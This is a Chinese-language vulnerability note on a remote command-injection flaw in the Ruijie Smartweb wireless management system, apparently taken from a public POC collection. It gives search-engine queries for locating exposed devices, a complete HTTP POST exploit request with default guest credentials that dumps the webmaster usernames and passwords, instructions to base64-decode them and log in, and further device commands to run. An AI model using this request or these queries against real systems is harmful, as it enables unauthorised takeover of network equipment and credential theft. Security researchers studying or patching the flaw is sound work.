# 锐捷 Smartweb管理系统 命令注入漏洞

# 一、漏洞描述
锐捷网络是一家拥有包括交换机、路由器、软件、安全防火墙、无线产品、存储等全系列的网络设备产品线及解决方案的专业化网络厂商。锐捷Smartweb系统存在远程命令执行漏洞，攻击者通过漏洞可以获取服务器权限，导致服务器失陷。

# 二、影响版本
+ 锐捷网络股份有限公司 无线smartweb管理系统

# 三、资产测绘
```java
hunterapp.name="Ruijie 锐捷 Smartweb"
fofa：title="无线smartWeb--登录页面"
```

+ 登录页面

![1693026690199-64fbe35e-4db9-4483-9ff4-60fd93531a2c.png](./img/tBfsUhE5mcdw2hI_/1693026690199-64fbe35e-4db9-4483-9ff4-60fd93531a2c-041676.png)

<font style="color:rgb(34, 34, 34);">1.执行查看用户名和密码POC，show webmaster users得到回显</font>

```plain
POST /WEB_VMS/LEVEL15/ HTTP/1.1
Host: xxx.xxx.xxx.xxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Authorization: Basic Z3Vlc3Q6Z3Vlc3Q=
Content-Length: 81
DNT: 1
Connection: close
Cookie: auth=Z3Vlc3Q6Z3Vlc3Q%3D; user=guest; login=1; oid=1.3.6.1.4.1.4881.1.1.10.1.3; type=WS5302

command=show webmaster users&strurl=exec%04&mode=%02PRIV_EXEC&signname=Red-Giant.
```

![1710773613327-d46e7ef8-c09c-4f7d-8b63-03f19fec9789.png](./img/tBfsUhE5mcdw2hI_/1710773613327-d46e7ef8-c09c-4f7d-8b63-03f19fec9789-719275.png)

base64解码后登录系统

![1710773670682-afc5a16e-fac1-4963-b723-b5b09ab69f6c.png](./img/tBfsUhE5mcdw2hI_/1710773670682-afc5a16e-fac1-4963-b723-b5b09ab69f6c-380750.png)

<font style="color:rgb(34, 34, 34);">可执行其它命令</font>

```plain
show running-config       查看当前生效的配置信息
show interface fastethernet 0/3   查看F0/3端口信息
show interface serial 1/2       查看S1/2端口信息
show interface                查看所有端口信息
show ip interface brief          以简洁方式汇总查看所有端口信息
show ip interface         查看所有端口信息
show version               查看版本信息

锐捷交换机命令参考：
https://www.bilibili.com/read/cv12330628
```

![1710773800917-a83c0375-e631-4ae2-a877-a5ae979a7d3b.png](./img/tBfsUhE5mcdw2hI_/1710773800917-a83c0375-e631-4ae2-a877-a5ae979a7d3b-014295.png)



> 更新: 2024-06-24 11:42:27  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/cdukm3k8snxldkns>